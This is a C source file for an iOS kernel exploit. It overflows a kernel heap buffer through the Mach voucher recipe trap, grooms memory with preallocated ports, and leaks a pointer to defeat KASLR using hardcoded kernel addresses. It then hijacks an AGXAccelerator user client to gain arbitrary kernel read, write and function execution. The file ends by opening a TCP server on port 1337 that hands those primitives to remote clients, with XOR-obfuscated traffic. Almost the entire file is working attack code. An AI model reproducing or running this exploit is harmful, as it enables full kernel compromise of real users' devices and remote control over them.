#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/time.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <arpa/inet.h>

#include <mach/mach.h>
#include <mach/mach_error.h>
#include <mach/mach_port.h>
#include <mach/mach_time.h>
#include <mach/mach_traps.h>

#include <mach/mach_voucher_types.h>
#include <mach/port.h>

#include <CoreFoundation/CoreFoundation.h>

// IOKit stuff

#define kIOMasterPortDefault MACH_PORT_NULL
#define IO_OBJECT_NULL MACH_PORT_NULL

#define LOGD(...) printf(__VA_ARGS__)
#define LOGI(...) printf(__VA_ARGS__)
#define LOGE(...) printf(__VA_ARGS__)

#ifndef MIN
#define MIN(x,y) (((x)<(y)) ? (x) : (y))
#endif

typedef mach_port_t io_iterator_t;
typedef mach_port_t io_service_t;
typedef mach_port_t io_connect_t;
typedef mach_port_t io_object_t;
typedef	char io_name_t[128];


CFMutableDictionaryRef
IOServiceMatching(const char* name );

kern_return_t
IOServiceGetMatchingServices(
                             mach_port_t masterPort,
                             CFDictionaryRef matching,
                             io_iterator_t * existing );

io_service_t
IOServiceGetMatchingService(
                            mach_port_t	masterPort,
                            CFDictionaryRef	matching);

io_object_t
IOIteratorNext(
               io_iterator_t	iterator );

kern_return_t
IOObjectGetClass(
                 io_object_t	object,
                 io_name_t	className );

kern_return_t
IOServiceOpen(
              io_service_t    service,
              task_port_t	owningTask,
              uint32_t	type,
              io_connect_t  *	connect );

kern_return_t
IOServiceClose(
               io_connect_t	connect );

kern_return_t
IOObjectRelease(
                io_object_t	object );

kern_return_t
IOConnectGetService(
                    io_connect_t	connect,
                    io_service_t  *	service );

// mach_vm protos

kern_return_t mach_vm_allocate
(
 vm_map_t target,
 mach_vm_address_t *address,
 mach_vm_size_t size,
 int flags
 );

kern_return_t mach_vm_deallocate
(
 vm_map_t target,
 mach_vm_address_t address,
 mach_vm_size_t size
 );



mach_port_t prealloc_port(int size) {
  kern_return_t err;
  mach_port_qos_t qos = {0};
  qos.prealloc = 1;
  qos.len = size;
  
  mach_port_name_t name = MACH_PORT_NULL;
  
  err = mach_port_allocate_full(mach_task_self(),
                                MACH_PORT_RIGHT_RECEIVE,
                                MACH_PORT_NULL,
                                &qos,
                                &name);
  
  if (err != KERN_SUCCESS) {
    LOGE("pre-allocated port allocation failed: %s\n", mach_error_string(err));
    return MACH_PORT_NULL;
  }
  
  return (mach_port_t)name;
}


io_service_t service = MACH_PORT_NULL;

io_connect_t alloc_userclient() {
  kern_return_t err;
  if (service == MACH_PORT_NULL) {
    service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("AGXAccelerator"));
    
    if (service == IO_OBJECT_NULL){
      LOGE("unable to find service\n");
      return 0;
    }
  }
  
  io_connect_t conn = MACH_PORT_NULL;
  err = IOServiceOpen(service, mach_task_self(), 5, &conn); // AGXCommandQueue, 0xdb8
  if (err != KERN_SUCCESS){
    LOGE("unable to get user client connection\n");
    return 0;
  }
  
  return conn;
}

#define MACH_VOUCHER_ATTR_ATM_CREATE ((mach_voucher_attr_recipe_command_t)510)

mach_port_t get_voucher() {
  mach_voucher_attr_recipe_data_t r = {
    .key = MACH_VOUCHER_ATTR_KEY_ATM,
    .command = MACH_VOUCHER_ATTR_ATM_CREATE
  };
  static mach_port_t p = MACH_PORT_NULL;
  
  if (p != MACH_PORT_NULL) {
    return p;
  }
  
  kern_return_t err = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&r, sizeof(r), &p);
  
  if (err != KERN_SUCCESS) {
    LOGE("failed to create voucher (%s)\n", mach_error_string(err));
  }
  LOGD("got voucher: %x\n", p);
  
  return p;
}

uint64_t map_fixed(uint64_t addr, uint64_t size) {
  uint64_t _addr = addr;
  kern_return_t err = mach_vm_allocate(mach_task_self(), &_addr, size, 0);
  if (err != KERN_SUCCESS || _addr != addr) {
    LOGE("failed to allocate fixed mapping: %s\n", mach_error_string(err));
  }
  return addr;
}

uint64_t map(uint64_t size) {
  uint64_t addr = 0;
  kern_return_t err = mach_vm_allocate(mach_task_self(), &addr, size, VM_FLAGS_ANYWHERE);
  if (err != KERN_SUCCESS) {
    LOGE("failed to allocate mapping: %s\n", mach_error_string(err));
  }
  return addr;
}

void unmap(uint64_t addr, uint64_t size) {
  kern_return_t err = mach_vm_deallocate(mach_task_self(), addr, size);
  if (err != KERN_SUCCESS) {
    LOGE("failed to unmap memory\n");
  }
  LOGD("unmap: %s\n", mach_error_string(err));
}

uint64_t roundup(uint64_t val, uint64_t pagesize) {
  val += pagesize - 1;
  val &= ~(pagesize - 1);
  return val;
}

void do_overflow(uint64_t kalloc_size, uint64_t overflow_length, uint8_t* overflow_data) {
  int pagesize = getpagesize();
  LOGD("pagesize: 0x%x\n", pagesize);
  
  
  // recipe_size will be used first as a pointer to a length to pass to kalloc
  // and then as a length (the userspace pointer will be used as a length)
  // it has to be a low address to pass the checks which make sure the copyin will stay in userspace
  
  // iOS has a hard coded check for copyin > 0x4000001:
  // this xcodeproj sets pagezero_size 0x16000 so we can allocate this low
  static uint64_t small_pointer_base = 0x3000000;
  static int mapped = 0;
  void* recipe_size = (void*)small_pointer_base;
  if (!mapped) {
    recipe_size = (void*)map_fixed(small_pointer_base, pagesize);
    mapped = 1;
  }
  *(uint64_t*)recipe_size = kalloc_size; // the kernel allocation size
  
  // this is how much data we want copyin to actually copy
  // we make sure it only copies this much by aligning the userspace buffer
  // such that after this many bytes there's an unmapped userspace page and the copyin stops and fails
  uint64_t actual_copy_size = kalloc_size + overflow_length;
  
  uint64_t alloc_size = roundup(actual_copy_size, pagesize) + pagesize; // want a page after to unmap
  
  uint64_t base = map(alloc_size);
  
  // unmap the page at the end so we can terminate the copy
  uint64_t end = base + roundup(actual_copy_size, pagesize);
  unmap(end, pagesize);
  
  // subtract the copy size from the end pointer to get the start so the last copy byte is right before the unmapped page:
  uint64_t start = end - actual_copy_size;
  
  // fill in the data to copy:
  uint8_t* recipe = (uint8_t*)start;
  
  memset(recipe, 0x41, kalloc_size);
  memcpy(recipe+kalloc_size, overflow_data, overflow_length);
  
  // trigger the bug!
  mach_port_t port = get_voucher();
  kern_return_t err = mach_voucher_extract_attr_recipe_trap(
                                                            port,
                                                            1,
                                                            recipe,
                                                            recipe_size);
}

kern_return_t catch_exception_raise
(
 mach_port_t exception_port,
 mach_port_t thread,
 mach_port_t task,
 exception_type_t exception,
 exception_data_t code,
 mach_msg_type_number_t codeCnt
 )
{
  // shouldn't reach
  //printf("catch_exception_raise\n");
  return KERN_FAILURE;
}

uint8_t* crash_stack = NULL;

// each time we get an exception message copy the first 32 registers into this buffer
uint64_t crash_buf[32] = {0}; // use the 32 general purpose ARM64 registers

kern_return_t catch_exception_raise_state
(
 mach_port_t exception_port,
 exception_type_t exception,
 const exception_data_t code,
 mach_msg_type_number_t codeCnt,
 int *flavor,
 const thread_state_t old_state,
 mach_msg_type_number_t old_stateCnt,
 thread_state_t new_state,
 mach_msg_type_number_t *new_stateCnt
 )
{
  //printf("catch_exception_raise_state\n");
  memcpy(crash_buf, old_state, sizeof(crash_buf));
  
  // make the thread exit:
  memset(new_state, 0, sizeof(_STRUCT_ARM_THREAD_STATE64));
  _STRUCT_ARM_THREAD_STATE64* new = (_STRUCT_ARM_THREAD_STATE64*)(new_state);
  
  // it needs a minimal stack:
  if (!crash_stack) {
    crash_stack = malloc(0x4000);
    crash_stack += 0x3ff0;
  }
  
  *new_stateCnt = old_stateCnt;
  
  new->__pc = (uint64_t)pthread_exit;
  new->__x[0] = 0;
  new->__sp = (uint64_t)crash_stack;
  
  return KERN_SUCCESS;
}

kern_return_t catch_exception_raise_state_identity
(
 mach_port_t exception_port,
 mach_port_t thread,
 mach_port_t task,
 exception_type_t exception,
 exception_data_t code,
 mach_msg_type_number_t codeCnt,
 int *flavor,
 thread_state_t old_state,
 mach_msg_type_number_t old_stateCnt,
 thread_state_t new_state,
 mach_msg_type_number_t *new_stateCnt
 )
{
  // shouldn't reach
  //printf("catch_exception_raise_state_identity\n");
  return KERN_FAILURE;
}

union max_msg {
  union __RequestUnion__exc_subsystem requests;
  union __ReplyUnion__exc_subsystem replies;
};

extern boolean_t exc_server(mach_msg_header_t *InHeadP, mach_msg_header_t *OutHeadP);

// implemented in load_regs_and_crash.s
void load_regs_and_crash(uint64_t* buf);

// (actually only 30 controlled qwords for the send)
struct thread_args {
  uint64_t buf[32];
  mach_port_t exception_port;
};

void* do_thread(void* arg) {
  struct thread_args* args = (struct thread_args*)arg;
  uint64_t buf[32];
  memcpy(buf, args->buf, sizeof(buf));
  
  kern_return_t err;
  err = thread_set_exception_ports(
                                   mach_thread_self(),
                                   EXC_MASK_ALL,
                                   args->exception_port,
                                   EXCEPTION_STATE, // we want to receive a catch_exception_raise_state message
                                   ARM_THREAD_STATE64);
  
  free(args);
  
  load_regs_and_crash(buf);
  printf("no crashy?");
  return NULL;
}

void prepare_prealloc_port(mach_port_t port) {
  mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
}

int port_has_message(mach_port_t port) {
  kern_return_t err;
  mach_port_seqno_t msg_seqno = 0;
  mach_msg_size_t msg_size = 0;
  mach_msg_id_t msg_id = 0;
  mach_msg_trailer_t msg_trailer; // NULL trailer
  mach_msg_type_number_t msg_trailer_size = sizeof(msg_trailer);
  err = mach_port_peek(mach_task_self(),
                       port,
                       MACH_RCV_TRAILER_NULL,
                       &msg_seqno,
                       &msg_size,
                       &msg_id,
                       (mach_msg_trailer_info_t)&msg_trailer,
                       &msg_trailer_size);
  
  return (err == KERN_SUCCESS);
}

// port needs to have a send right
void send_prealloc_msg(mach_port_t port, uint64_t* buf, int n) {
  struct thread_args* args = malloc(sizeof(struct thread_args));
  memset(args, 0, sizeof(struct thread_args));
  memcpy(args->buf, buf, n*8);
  
  args->exception_port = port;
  
  // start a new thread passing it the buffer and the exception port
  pthread_t t;
  pthread_create(&t, NULL, do_thread, (void*)args);
  
  // associate the pthread_t with the port so that we can join the correct pthread
  // when we receive the exception message and it exits:
  kern_return_t err = mach_port_set_context(mach_task_self(), port, (mach_port_context_t)t);
  LOGD("set context\n");
  // wait until the message has actually been sent:
  while(!port_has_message(port)){;}
  LOGD("message was sent\n");
}

// the returned pointer is only valid until the next call to this function
// ownership is retained by this function
uint64_t* receive_prealloc_msg(mach_port_t port) {
  kern_return_t err = mach_msg_server_once(exc_server,
                                           sizeof(union max_msg),
                                           port,
                                           MACH_MSG_TIMEOUT_NONE);
  
  LOGD("receive_prealloc_msg: %s\n", mach_error_string(err));
  
  // get the pthread context back from the port and join it:
  pthread_t t;
  err = mach_port_get_context(mach_task_self(), port, (mach_port_context_t*)&t);
  pthread_join(t, NULL);
  
  return &crash_buf[0];
}



uint64_t kaslr_shift = 0;
uint64_t kernel_base = 0;
uint64_t get_metaclass = 0;
uint64_t osserializer_serialize = 0;
uint64_t ret = 0;
uint64_t kernel_uuid_copy = 0;

uint64_t kernel_buffer_base = 0;

uint64_t legit_object[32];


mach_port_t oob_port = MACH_PORT_NULL;
mach_port_t target_uc = MACH_PORT_NULL;

// the actual read primitive
typedef struct _uint128_t {
  uint64_t lower;
  uint64_t upper;
} uint128_t;


void exec2(uint64_t func, uint64_t arg1, uint64_t arg2) {
    uint64_t r_obj[11];
    r_obj[0] = kernel_buffer_base+0x8;  // fake vtable points 8 bytes into this object
    r_obj[1] = 0x20003;                 // refcount
    r_obj[2] = arg1;                    // obj + 0x10 -> rdi (memmove dst)
    r_obj[3] = arg2;                    // obj + 0x18 -> rsi (memmove src)
    r_obj[4] = func;                    // obj + 0x20 -> fptr
    r_obj[5] = ret;                     // vtable + 0x20 (::retain)
    r_obj[6] = osserializer_serialize;  // vtable + 0x28 (::release)
    r_obj[7] = 0x0;                     //
    r_obj[8] = get_metaclass;           // vtable + 0x38 (::getMetaClass)
    r_obj[9] = 0;                       // r/w buffer
    r_obj[10] = 0;
    
    send_prealloc_msg(oob_port, r_obj, 11);
    
    io_service_t service = MACH_PORT_NULL;
    LOGD("fake_obj: 0x%x\n", target_uc);
    kern_return_t err = IOConnectGetService(target_uc, &service);
    
    receive_prealloc_msg(oob_port);
    
    send_prealloc_msg(oob_port, legit_object, 30);
    receive_prealloc_msg(oob_port);
    
    return;
}

uint128_t rk128(uint64_t address) {
  uint64_t r_obj[11];
  r_obj[0] = kernel_buffer_base+0x8;  // fake vtable points 8 bytes into this object
  r_obj[1] = 0x20003;                 // refcount
  r_obj[2] = kernel_buffer_base+0x48; // obj + 0x10 -> rdi (memmove dst)
  r_obj[3] = address;                 // obj + 0x18 -> rsi (memmove src)
  r_obj[4] = kernel_uuid_copy;        // obj + 0x20 -> fptr
  r_obj[5] = ret;                     // vtable + 0x20 (::retain)
  r_obj[6] = osserializer_serialize;  // vtable + 0x28 (::release)
  r_obj[7] = 0x0;                     //
  r_obj[8] = get_metaclass;           // vtable + 0x38 (::getMetaClass)
  r_obj[9] = 0;                       // r/w buffer
  r_obj[10] = 0;
  
  send_prealloc_msg(oob_port, r_obj, 11);
  
  io_service_t service = MACH_PORT_NULL;
  LOGD("fake_obj: 0x%x\n", target_uc);
  kern_return_t err = IOConnectGetService(target_uc, &service);
  
  uint64_t* out = receive_prealloc_msg(oob_port);
  uint128_t value = {out[9], out[10]};
  
  send_prealloc_msg(oob_port, legit_object, 30);
  receive_prealloc_msg(oob_port);
  
  return value;
}

void wk128(uint64_t address, uint128_t value) {
  uint64_t r_obj[11];
  r_obj[0] = kernel_buffer_base+0x8;  // fake vtable points 8 bytes into this object
  r_obj[1] = 0x20003;                 // refcount
  r_obj[2] = address;                 // obj + 0x10 -> rdi (memmove dst)
  r_obj[3] = kernel_buffer_base+0x48; // obj + 0x18 -> rsi (memmove src)
  r_obj[4] = kernel_uuid_copy;        // obj + 0x20 -> fptr
  r_obj[5] = ret;                     // vtable + 0x20 (::retain)
  r_obj[6] = osserializer_serialize;  // vtable + 0x28 (::release)
  r_obj[7] = 0x0;                     //
  r_obj[8] = get_metaclass;           // vtable + 0x38 (::getMetaClass)
  r_obj[9] = value.lower;             // r/w buffer
  r_obj[10] = value.upper;
  
  send_prealloc_msg(oob_port, r_obj, 11);
  
  io_service_t service = MACH_PORT_NULL;
  LOGD("fake_obj: 0x%x\n", target_uc);
  kern_return_t err = IOConnectGetService(target_uc, &service);
  
  receive_prealloc_msg(oob_port);

  send_prealloc_msg(oob_port, legit_object, 30);
  receive_prealloc_msg(oob_port);
  
  return;
}

// won't work for the final qword on a page if the next is unmapped...
uint64_t rk64(uint64_t address){
  uint128_t val = rk128(address);
  return val.lower;
}

void wk64(uint64_t address, uint64_t value){
  uint128_t old = rk128(address);
  uint128_t new = {value, old.upper};
  wk128(address, new);
}

uint64_t prepare_kernel_rw() {
  int prealloc_size = 0x900; // kalloc.4096
  
  for (int i = 0; i < 5500; i++){
    prealloc_port(prealloc_size);
  }
  
  // these will be contiguous now, convienient!
  
  mach_port_t holder = prealloc_port(prealloc_size);
  mach_port_t first_port = prealloc_port(prealloc_size);
  mach_port_t second_port = prealloc_port(prealloc_size);
  
  // free the holder:
  mach_port_destroy(mach_task_self(), holder);
  
  // reallocate the holder and overflow out of it
  uint64_t overflow_bytes[] = {0x1104,0,0,0,0,0,0,0};
  do_overflow(0x1000, 64, overflow_bytes);
  
  // grab the holder again
  holder = prealloc_port(prealloc_size);
  
  prepare_prealloc_port(first_port);
  prepare_prealloc_port(second_port);
  
  // send a message to the first port; overwriting the header of the second prealloced message
  // with a legitmate header:
  
  uint64_t valid_header[] = {0xc40, 0, 0, 0, 0, 0, 0, 0};
  send_prealloc_msg(first_port, valid_header, 8);
  
  // send a message to the second port; writing a pointer to itself in the prealloc buffer
  send_prealloc_msg(second_port, valid_header, 8);
  
  // receive on the first port, reading the header of the second:
  uint64_t* buf = receive_prealloc_msg(first_port);
  
  for (int i = 0; i < 8; i++) {
    LOGD("0x%llx\n", buf[i]);
  }
  
  kernel_buffer_base = buf[1];
  
  // receive the message on second
  receive_prealloc_msg(second_port);
  
  // send another message on first, writing a valid, safe header back over second
  send_prealloc_msg(first_port, valid_header, 8);
  
  // free second and get it reallocated as a userclient:
  mach_port_deallocate(mach_task_self(), second_port);
  mach_port_destroy(mach_task_self(), second_port);
  
  mach_port_t uc = alloc_userclient();
  
  // read back the start of the userclient buffer:
  buf = receive_prealloc_msg(first_port);
  LOGD("user client? :\n");
  for (int i = 0; i < 8; i++) {
    LOGD("0x%llx\n", buf[i]);
  }
  
  // save a copy of the original object:
  memcpy(legit_object, buf, sizeof(legit_object));
  
  // this is the vtable for AGXCommandQueue
  uint64_t vtable = buf[0];
  
  // rebase the symbols
  kaslr_shift = vtable - 0xFFFFFFF006F837D0;
  
  kernel_base = 0xFFFFFFF007004000 + kaslr_shift;
  get_metaclass = 0xFFFFFFF00747B03C + kaslr_shift;
  osserializer_serialize = 0xFFFFFFF007491A3C + kaslr_shift;
  ret = 0xFFFFFFF00747B044 + kaslr_shift;
  kernel_uuid_copy = 0xFFFFFFF00749CEBC + kaslr_shift;
  
  // save the port and userclient so we can use them for the r/w
  oob_port = first_port;
  target_uc = uc;
  
  LOGD("all done!\n");
  
  return kernel_base;
}

int recv_buffer(int sockfd, void* buffer, size_t buffer_len) {
    size_t bytes_read = 0;
    while (bytes_read < buffer_len) {
        ssize_t res = recv(sockfd, buffer + bytes_read, buffer_len - bytes_read, 0);
        if (res <= 0) {
            LOGE("Failed to recv: %zd\n", res);
            return -1;
        }
        bytes_read += res;
    }
    return 0;
}

int handle_client(int clientfd) {

    //Letting the client know what the slide is, so it can adjust pointers accordingly
    send(clientfd, &kaslr_shift, sizeof(kaslr_shift), 0);
    
    //Command loop
    uint64_t mask = 0xFFFFFFFFFFFFFFFFULL;
    while (true) {
        //Reading the command code
        char command;
        if (recv_buffer(clientfd, &command, sizeof(command)) < 0) {
            LOGE("Failed to read command : %d\n", errno);
            return -1;
        }
    
        //Is this a read command?
        if (command == 'r') {
            uint64_t addr;
            if (recv_buffer(clientfd, &addr, sizeof(addr)) < 0) {
                LOGE("Failed to read address : %d\n", errno);
                return -1;
            }
            addr ^= mask;
            uint128_t val = rk128(addr);
            LOGI("Read - Addr: %016llx, Value : %016llx %016llx\n", addr, ((uint64_t*)&val)[0], ((uint64_t*)&val)[1]);
            ((uint64_t*)&val)[0] ^= mask;
            ((uint64_t*)&val)[1] ^= mask;
            
            send(clientfd, &val, sizeof(val), 0);
        }
        //Is this a read chunk command?
        else if (command == 'c') {
            uint64_t args[2];
            if (recv_buffer(clientfd, &args, sizeof(args)) < 0) {
                LOGE("Failed to read address : %d\n", errno);
                return -1;
            }
            uint64_t addr = args[0] ^ mask;
            uint64_t size = args[1] ^ mask;
            LOGI("Read Chunk - Addr: %016llx, Size: %016llx\n", addr, size);
            
            uint8_t* buffer = malloc(size);
            if (!buffer)
                return -1;
            uint64_t off = 0;
            
            //Reading the first unaligned address, if necessary
            uint64_t modulo = addr % sizeof(uint128_t);
            if (modulo != 0) {
                uint128_t first_val = rk128(addr - modulo);
                uint64_t len = MIN(sizeof(uint128_t) - modulo, size);
                memcpy(buffer, (uint8_t*)(&first_val) + modulo, len);
                off += len;
            }
            
            while (off < size) {
                uint128_t val = rk128(addr + off);
                uint64_t len = MIN(size - off, sizeof(uint128_t));
                memcpy(buffer + off, &val, len);
                off += len;
            }
            
            //Obfuscating the block's contents
            for (off=0; off<size; off++)
                buffer[off] ^= 0xFF;
            
            //Writing the chunk back
            ssize_t bytes_sent = 0;
            while (bytes_sent < size)
                bytes_sent += send(clientfd, buffer+bytes_sent, size-bytes_sent, 0);
            free(buffer);
        }
        //Is this a write command?
        else if (command == 'w') {
            uint64_t args[2];
            if (recv_buffer(clientfd, &args, sizeof(args)) < 0) {
                LOGE("Failed to read args : %d\n", errno);
                return -1;
            }
            args[0] ^= mask;
            args[1] ^= mask;
            LOGI("Write - Addr: %016llx, Value : %016llx\n", args[0], args[1]);
            wk64(args[0], args[1]);
            uint64_t res = 0;
            send(clientfd, &res, sizeof(res), 0);
        }
        //Is this an exec command?
        else if (command == 'x') {
            uint64_t args[3];
            if (recv_buffer(clientfd, &args, sizeof(args)) < 0) {
                LOGE("Failed to read args : %d\n", errno);
                return -1;
            }
            args[0] ^= mask;
            args[1] ^= mask;
            args[2] ^= mask;
            LOGI("Exec - Func: %016llx, Arg1 : %016llx, Arg2 : %016llx\n", args[0], args[1], args[2]);
            exec2(args[0], args[1], args[2]);
            uint64_t res = 0;
            send(clientfd, &res, sizeof(res), 0);
        }
        //Is this a data race command?
        else if (command == 'f') {
            uint64_t args[2];
            if (recv_buffer(clientfd, &args, sizeof(args)) < 0) {
                LOGE("Failed to read args : %d\n", errno);
                return -1;
            }
            args[0] ^= mask;
            args[1] ^= mask;
            LOGI("Race - Addr %016llx, Val : %016llx\n", args[0], args[1]);
            if (args[0] % sizeof(uint64_t) == 0) {
                uint64_t prev = rk64(args[0]);
                wk64(args[0], (args[1] & 0xFFFFFFFF) | (prev & 0xFFFFFFFF00000000));
                wk64(args[0], prev);
            }
            else {
                uint64_t prev = rk64(args[0] - sizeof(uint32_t));
                wk64(args[0] - sizeof(uint32_t), (args[1] & 0xFFFFFFFF00000000) | (prev & 0xFFFFFFFF));
                wk64(args[0] - sizeof(uint32_t), prev);
            }
            uint64_t res = 0;
            send(clientfd, &res, sizeof(res), 0);
        }
        else {
            LOGE("Unsupported command %u!\n", (unsigned)command);
            return -1;
        }
    }
}

int start_server() {
    
    int sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock < 0) {
        LOGE("Failed to open socket : %d\n", errno);
        return -1;
    }
    struct sockaddr_in sin;
    memset(&sin, 0, sizeof(sin));
    sin.sin_len = sizeof(sin);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(1337);
    sin.sin_addr.s_addr = INADDR_ANY;
    
    struct ifreq ifr;
    ifr.ifr_addr.sa_family = AF_INET;
    ioctl(sock, SIOCGIFADDR, &ifr);
    LOGI("IP: %s", inet_ntoa(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr));
    
    if (bind(sock, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
        LOGE("Failed to bind socket : %d\n", errno);
        close(sock);
        return -1;
    }
    if (listen(sock, 1) < 0) {
        LOGE("Failed to listen for incoming connections: %d\n", errno);
        close(sock);
        return -1;
    }
    LOGI("Started listening on %d\n", sock);
    struct sockaddr_in peer_addr;
    
    //Waiting for clients
    while (true) {
        int clientfd;
        socklen_t peerlen = sizeof(peer_addr);
        if ((clientfd = accept(sock, &peer_addr, &peerlen)) < 0) {
            LOGE("Failed to accept client : %d\n", errno);
            continue;
        }
        
        //Handle the client
        LOGI("Got a client! %d\n", clientfd);
        int res = handle_client(clientfd);
        LOGI("Done with client %d, res %d\n", clientfd, res);
        
        close(clientfd);
    }
}

int jb_go() {

    //Preparing RW, and ensuring it worked
    uint64_t kernel_base = prepare_kernel_rw();
    uint64_t val = rk64(kernel_base);
    LOGI("read from kernel memory: 0x%016llx\n", val);
    uint64_t test_val = 0x41424344abcdef;
    wk64(kernel_buffer_base+0xfe0, test_val);
    uint64_t read_back = rk64(kernel_buffer_base+0xfe0);
    LOGI("wrote: 0x%016llx\n", test_val);
    LOGI("read back: 0x%016llx\n", read_back);
    if (test_val != read_back) {
        LOGE("Failed to achieve RW, aborting\n");
        return -1;
    }
    
    //Start the server
    return start_server();
}
